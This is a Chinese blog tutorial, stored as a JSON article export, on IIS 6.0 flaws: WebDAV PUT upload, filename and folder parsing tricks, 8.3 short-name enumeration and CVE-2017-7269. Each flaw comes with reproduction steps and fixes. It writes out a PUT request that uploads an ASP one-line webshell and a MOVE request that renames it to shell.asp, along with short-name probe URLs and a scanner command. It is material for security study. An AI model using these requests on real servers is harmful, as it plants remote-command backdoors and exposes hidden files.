{"title":"IIS漏洞","uid":"0472d278667be4946aa7e2a62cbccec5","slug":"IIS漏洞","date":"2021-10-09T10:26:44.575Z","updated":"2021-10-09T10:27:13.908Z","comments":true,"path":"api/articles/IIS漏洞.json","keywords":null,"cover":[],"content":"<h1 id=\"一、IIS6（03server）\"><a href=\"#一、IIS6（03server）\" class=\"headerlink\" title=\"一、IIS6（03server）\"></a>一、IIS6（03server）</h1><hr>\n<h2 id=\"1-1、PUT文件上传漏洞\"><a href=\"#1-1、PUT文件上传漏洞\" class=\"headerlink\" title=\"1.1、PUT文件上传漏洞\"></a>1.1、PUT文件上传漏洞</h2><h3 id=\"1-1-1漏洞描述\"><a href=\"#1-1-1漏洞描述\" class=\"headerlink\" title=\"1.1.1漏洞描述\"></a>1.1.1漏洞描述</h3><p>IIS Server 6.0在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p>\n<h3 id=\"1-1-2漏洞复现\"><a href=\"#1-1-2漏洞复现\" class=\"headerlink\" title=\"1.1.2漏洞复现\"></a>1.1.2漏洞复现</h3><p>1）开启 WebDAV 和写权限</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a1dc9caa2092e8c89d2fcceaf8ae5d549?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmExZGM5Y2FhMjA5MmU4Yzg5ZDJmY2NlYWY4YWU1ZDU0OSJ9.B0cyDphjJE7Ni4ZDHXOVNSn616IPyc9ytSjtl28RNrk&download=image.png\"></p>\n<p><img src=\"https://tcs.teambition.net/storage/312a2fa9f5e57eb5aad0c33cfd6a25a1a17c?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEyZmE5ZjVlNTdlYjVhYWQwYzMzY2ZkNmEyNWExYTE3YyJ9.DwEQpXEhq_M4Yt2SA5OjOuKiAxRESMvTCp6MQ64OiUs&download=image.png\"></p>\n<p>2）用burpsuite 提交OPTIONS 查看支持的协议</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a8ccc61b9d5ebacee7ab93834f3c52e44?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE4Y2NjNjFiOWQ1ZWJhY2VlN2FiOTM4MzRmM2M1MmU0NCJ9.Rycv5JwoReLs6CsECvPaQgM0pp9f0w3UgztOLuEmYu8&download=image.png\"></p>\n<p>上传一句话木马</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">PUT &#x2F;test.txt HTTP&#x2F;1.1 \nHost: upload.moonteam.com \nContent-Length: 23\n\n&lt;%eval request(&quot;cmd&quot;)%&gt;</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a73b7ec4e102e36c98fcf4222ef845e5f?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE3M2I3ZWM0ZTEwMmUzNmM5OGZjZjQyMjJlZjg0NWU1ZiJ9.M2REVBniuj4wCSguvM5Xa2pTawi9bNzf5i246o2Z_xU&download=image.png\"></p>\n<p>重命名test.txt文件</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">MOVE &#x2F;test.txt HTTP&#x2F;1.1 \nHost: upload.moonteam.com \nDestination: http:&#x2F;&#x2F;upload.moonteam.com&#x2F;shell.asp\n\n</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a0d701af2dc9e009ff874494df7743ee4?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwZDcwMWFmMmRjOWUwMDlmZjg3NDQ5NGRmNzc0M2VlNCJ9.p_87stxBA6rYmb5g9v0rs5Kv8FS-cltMAZBytakJnBk&download=image.png\"></p>\n<p>shell.asp写入成功</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a0231dac4adb1d88ec54e304a6fe0e2c4?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwMjMxZGFjNGFkYjFkODhlYzU0ZTMwNGE2ZmUwZTJjNCJ9.gdtkrOFggfr_Qbvl_PVL7OccuYMAEES26s2AK0r7S-M&download=image.png\"></p>\n<h3 id=\"1-1-3漏洞修复\"><a href=\"#1-1-3漏洞修复\" class=\"headerlink\" title=\"1.1.3漏洞修复\"></a>1.1.3漏洞修复</h3><p>1.关闭webdav</p>\n<p>2.关闭写入权限</p>\n<h2 id=\"1-2、IIS解析漏洞\"><a href=\"#1-2、IIS解析漏洞\" class=\"headerlink\" title=\"1.2、IIS解析漏洞\"></a>1.2、IIS解析漏洞</h2><h3 id=\"1-2-1-1基于文件名漏洞描述\"><a href=\"#1-2-1-1基于文件名漏洞描述\" class=\"headerlink\" title=\"1.2.1.1基于文件名漏洞描述\"></a>1.2.1.1基于文件名漏洞描述</h3><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 ; 号及其后面的内容，相当于截断。</p>\n<p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p>\n<p>iis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件</p>\n<p>C:\\WINDOWS\\system32\\inetsrv\\asp.dll 所以都解析成asp</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a06158994ab6f9b390b84097eec2ce347?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwNjE1ODk5NGFiNmY5YjM5MGI4NDA5N2VlYzJjZTM0NyJ9.e_HyY0wrJt8i3ckQMCFuzW1OroVMKi9ZFkNBsmcCRcY&download=image.png\"></p>\n<h3 id=\"1-2-1-2漏洞复现\"><a href=\"#1-2-1-2漏洞复现\" class=\"headerlink\" title=\"1.2.1.2漏洞复现\"></a>1.2.1.2漏洞复现</h3><p>通过文件上传，或者创建文件，格式为*.asp;.jpg</p>\n<p><img src=\"https://tcs.teambition.net/storage/312ad2ef5b38df57c2865a3c49bf1b97e7a1?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFkMmVmNWIzOGRmNTdjMjg2NWEzYzQ5YmYxYjk3ZTdhMSJ9.-RvUVKPv-3vzm-YxHec4PSNizCPhWpAXDNmRedoz76c&download=image.png\"></p>\n<h3 id=\"1-2-1-3漏洞修复\"><a href=\"#1-2-1-3漏洞修复\" class=\"headerlink\" title=\"1.2.1.3漏洞修复\"></a>1.2.1.3漏洞修复</h3><p>1.禁止创建和上传此类畸形文件</p>\n<p>2.图片存放目录设置成禁止脚本文件执行</p>\n<p>3.升级iis版本</p>\n<h3 id=\"1-2-2-1基于文件夹漏洞描述\"><a href=\"#1-2-2-1基于文件夹漏洞描述\" class=\"headerlink\" title=\"1.2.2.1基于文件夹漏洞描述\"></a>1.2.2.1基于文件夹漏洞描述</h3><p>该版本默认将 *.asp/ 目录下的所有文件当成Asp解析。</p>\n<h3 id=\"1-2-2-2漏洞复现\"><a href=\"#1-2-2-2漏洞复现\" class=\"headerlink\" title=\"1.2.2.2漏洞复现\"></a>1.2.2.2漏洞复现</h3><p>创建文件.asp文件夹 上传图片格式后门到此目录</p>\n<p><img src=\"https://tcs.teambition.net/storage/312ad2b4c479c3dc349960d76822201fbe21?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFkMmI0YzQ3OWMzZGMzNDk5NjBkNzY4MjIyMDFmYmUyMSJ9.tRKX47DzHFDoC1XJTXZpHVrAZ_emTmU_IF9xZW1CejE&download=image.png\"></p>\n<h3 id=\"1-2-2-3漏洞修复\"><a href=\"#1-2-2-3漏洞修复\" class=\"headerlink\" title=\"1.2.2.3漏洞修复\"></a>1.2.2.3漏洞修复</h3><p>1.禁止创建此类文件夹</p>\n<p>3.升级iis版本</p>\n<h2 id=\"1-3IIS短文件名漏洞\"><a href=\"#1-3IIS短文件名漏洞\" class=\"headerlink\" title=\"1.3IIS短文件名漏洞\"></a>1.3IIS短文件名漏洞</h2><h3 id=\"1-3-1漏洞描述\"><a href=\"#1-3-1漏洞描述\" class=\"headerlink\" title=\"1.3.1漏洞描述\"></a>1.3.1漏洞描述</h3><p>简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短文件名的效果。</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a456e2ddb07107e92d3fa7f1528f69b4d?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0NTZlMmRkYjA3MTA3ZTkyZDNmYTdmMTUyOGY2OWI0ZCJ9.OaSHANfTenkxnMlzRlZIcXhAqyQBt7pwawI2miRajlA&download=image.png\"></p>\n<p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p>\n<p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p>\n<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六 种</p>\n<p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p>\n<h3 id=\"1-3-2漏洞复现\"><a href=\"#1-3-2漏洞复现\" class=\"headerlink\" title=\"1.3.2漏洞复现\"></a>1.3.2漏洞复现</h3><p> IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;=8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现。</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a59b9493ee606dcc5a7b3af474be1aca7?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE1OWI5NDkzZWU2MDZkY2M1YTdiM2FmNDc0YmUxYWNhNyJ9.nbMkjFwr_U6kIMSX4pHtvAjvxLvHNwv-ILetZHhV2TY&download=image.png\"></p>\n<p>短文件名特征：</p>\n<p>1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增</p>\n<p><img src=\"https://tcs.teambition.net/storage/312aa6b70d44e682954e0ea82ef044b4bd06?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFhNmI3MGQ0NGU2ODI5NTRlMGVhODJlZjA0NGI0YmQwNiJ9.7WiskuYCl77U8TXZnW_nFdRJCzVBz7LKiE_Ue0jxNvo&download=image.png\"></p>\n<p>2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断</p>\n<p>3.所有小写字母均转换成大写的字母</p>\n<p>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀</p>\n<p>5.长文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包含空格或者其他部分特殊字符,不论长度均会生成短文件</p>\n<p>使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名</p>\n<p>注：* 可以匹配n个字符, n可以为0 </p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;*~1*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a8e31fb78645dab76dbecf1a93f882548?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE4ZTMxZmI3ODY0NWRhYjc2ZGJlY2YxYTkzZjg4MjU0OCJ9.BxYEY1ShL0wKB2JbQVfI1-UcTaPCWMT-QwxEGh-1diU&download=image.png\"></p>\n<p>通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;zzzz*~1*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312ab946c8de0cdd181f6c07f70bb95bcb90?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFiOTQ2YzhkZTBjZGQxODFmNmMwN2Y3MGJiOTViY2I5MCJ9.xlcrNOigpreon8A8bpULlMJoYQ05UQeaagTF8EqgFG8&download=image.png\"></p>\n<p>4、通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞</p>\n<p>5、判断漏洞存在后,接下来手工详细分析猜解IIS短文件名</p>\n<p>在网站目录下新建一个 abcde1231111.txt文件,分别访问</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;a*~1*&#x2F;a.aspx \nhttp:&#x2F;&#x2F;upload.moonteam.com&#x2F;b*~1*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a461a1730b5f8acb0c3bd39440af6013f?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0NjFhMTczMGI1ZjhhY2IwYzNiZDM5NDQwYWY2MDEzZiJ9.5B9OsGfbTOQNnSPJl7xu485c1DUUNc2ldVDCEO9UziE&download=image.png\"></p>\n<p><img src=\"https://tcs.teambition.net/storage/312a41ebcfd6fd1ad4d39ff286bc49073059?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0MWViY2ZkNmZkMWFkNGQzOWZmMjg2YmM0OTA3MzA1OSJ9.LFibwffg0pardP3emaDmS6v8TRgLetsANqVE73zFJkg&download=image.png\"></p>\n<p>通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。</p>\n<p>通过上面的方法接着往后猜</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;abcde*~1*&#x2F;a.aspx</code></pre>\n\n<p>到这文件名已经出来了，接着就是判断是目录还是文件。</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a16f3d349274970f3f5eb3ffa64890961?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmExNmYzZDM0OTI3NDk3MGYzZjVlYjNmZmE2NDg5MDk2MSJ9.4knWUSbD1Fj0PmvZCFrYKn3LALpxWcnTAw3TpE7tM9U&download=image.png\"></p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;abcde*~1&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a8adfceebf928a23a0f0ff504f7733a14?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE4YWRmY2VlYmY5MjhhMjNhMGYwZmY1MDRmNzczM2ExNCJ9.a0yHekLRhDtyexXEp4jLf5y194sH867-66fPl8mbA_s&download=image.png\"></p>\n<p>判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;abcde*~1.a*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a003642d7b42c63c072a2adc97f7a2f98?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwMDM2NDJkN2I0MmM2M2MwNzJhMmFkYzk3ZjdhMmY5OCJ9.VRkMQCXpCuJi9s2aj3A0-VNEc52389WJL0_b38ZJkWM&download=image.png\"></p>\n<p>第一个是字符是t开头的，接着往后测试</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;abcde*~1.t*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a659b2536a16976964f1dbc596c48659b?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE2NTliMjUzNmExNjk3Njk2NGYxZGJjNTk2YzQ4NjU5YiJ9.nVgB-0ifdtkRfcaD4DLaxHI2vzqQ-yI8wBpbFOoQgUU&download=image.png\"></p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;upload.moonteam.com&#x2F;abcde*~1.txt*&#x2F;a.aspx</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a040d3ea843ddbaf55922000ce8275327?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwNDBkM2VhODQzZGRiYWY1NTkyMjAwMGNlODI3NTMyNyJ9.wNMxVwV1n-vPAkgbaCMsQK5UMzgpmrph5xzUO4cJ55o&download=image.png\"></p>\n<p>6.按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解abcde1231111.txt文件名</p>\n<p>7.使用IIS短文件名扫描软件，获取目标存在哪些短文件名</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">python iis_shortname_Scan.py http:&#x2F;&#x2F;upload.moonteam.com&#x2F;</code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312ad9368d50e7e672b651c044952a869db1?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFkOTM2OGQ1MGU3ZTY3MmI2NTFjMDQ0OTUyYTg2OWRiMSJ9.dlTnxsi4vQ5Py4G_xIJp33zc_XIsY8VDd2GwwVqIrd8&download=image.png\"></p>\n<h3 id=\"1-3-3漏洞修复\"><a href=\"#1-3-3漏洞修复\" class=\"headerlink\" title=\"1.3.3漏洞修复\"></a>1.3.3漏洞修复</h3><p>1、升级.net framework</p>\n<p>2、修改注册表键值：</p>\n<p>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem</p>\n<p>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p>\n<p>命令行关闭 fsutil behavior set disable8dot3 1</p>\n<p>新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a4aee914423b41661ebf871418609fafb?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0YWVlOTE0NDIzYjQxNjYxZWJmODcxNDE4NjA5ZmFmYiJ9.kVLLNfYuWLe3o7Zn0cMtRVkBvt9oWnI54kra0XJuhFY&download=image.png\"></p>\n<p>注:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消失。如果不重新复制，已经存在的短文件名则是不会消失的。</p>\n<p>将web文件夹的内容拷贝到另一个位置，如c:\\www到c:\\ww,然后删除原文件夹，再重命名c:\\ww到c:\\www</p>\n<h2 id=\"1-4-iis-RCE-CVE-2017-7269\"><a href=\"#1-4-iis-RCE-CVE-2017-7269\" class=\"headerlink\" title=\"1.4 iis RCE-CVE-2017-7269\"></a>1.4 iis RCE-CVE-2017-7269</h2><h3 id=\"1-4-1漏洞描述\"><a href=\"#1-4-1漏洞描述\" class=\"headerlink\" title=\"1.4.1漏洞描述\"></a>1.4.1漏洞描述</h3><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 If:&lt;http:// 开头的长标头执行任意代码 PROPFIND请求</p>\n<h3 id=\"1-4-2漏洞复现\"><a href=\"#1-4-2漏洞复现\" class=\"headerlink\" title=\"1.4.2漏洞复现\"></a>1.4.2漏洞复现</h3><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a01fb13873e167dfc76fce2b6c531a86b?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3OTk3OCwiaWF0IjoxNjMzNzc1MTc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwMWZiMTM4NzNlMTY3ZGZjNzZmY2UyYjZjNTMxYTg2YiJ9.j-_70rRZ9z85iBiTZkAls3ErwkhPdnDRHnTsNTdiRJI&download=image.png\"></p>\n<p><a href=\"https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269\"><strong>https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</strong></a></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 